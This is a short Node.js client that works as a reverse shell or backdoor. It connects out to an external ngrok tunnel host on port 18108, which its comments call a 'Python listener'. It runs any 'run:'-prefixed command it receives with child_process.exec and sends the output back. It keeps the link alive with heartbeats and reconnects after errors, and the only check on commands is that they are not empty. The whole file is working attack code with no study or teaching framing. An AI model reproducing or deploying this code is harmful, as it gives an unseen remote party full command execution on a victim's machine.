const net = require('net');
const fs = require('fs');
const { exec } = require('child_process');

// Server configuration
const HOST = '4.tcp.eu.ngrok.io';  // Python listener's IP address
const PORT = 18108;         // Python listener's port
const LOG_FILE = 'client.log';

// Connect to Python server
const client = new net.Socket();
client.connect(PORT, HOST, () => {
    console.log('[+] Connected to Python server');
    logActivity('[+] Connected to Python server');
});

// Logging function
function logActivity(message) {
    const logMessage = `[${new Date().toISOString()}] ${message}\n`;
    fs.appendFile(LOG_FILE, logMessage, (err) => {
        if (err) throw err;
    });
}

// Function to execute system command
function executeCommand(command) {
    exec(command, (error, stdout, stderr) => {
        if (error) {
            logActivity(`Error executing command: ${error}`);
            client.write(`Error: ${error.message}`);
            return;
        }
        logActivity(`Executed: ${command}`);
        client.write(`Result: ${stdout}`);
    });
}

// Function to handle incoming commands
function handleCommand(command) {
    if (validateCommand(command)) {
        if (command.startsWith('run:')) {
            executeCommand(command.slice(4)); // Run the command without 'run:' prefix
        } else if (command === 'status') {
            client.write('System is running');
        } else {
            client.write('Unknown command');
        }
    } else {
        client.write('Invalid command');
    }
}

// Command validation function
function validateCommand(command) {
    return command.trim() !== ''; // Ensure command is not empty
}

// Handle incoming data (commands from Python server)
client.on('data', (data) => {
    const command = data.toString().trim();
    logActivity(`[+] Command received: ${command}`);
    handleCommand(command);
});

// Heartbeat (keep-alive mechanism)
setInterval(() => {
    client.write('heartbeat');
    logActivity('[+] Heartbeat sent to server');
}, 30000); // Send heartbeat every 30 seconds

// Handle connection closure
client.on('close', () => {
    console.log('[!] Connection closed');
    logActivity('[!] Connection closed');
});

// Handle connection errors
client.on('error', (err) => {
    logActivity(`[!] Connection error: ${err}`);
    console.error(`[!] Connection error: ${err}`);
    setTimeout(() => client.connect(PORT, HOST), 5000); // Try to reconnect after 5 seconds
});
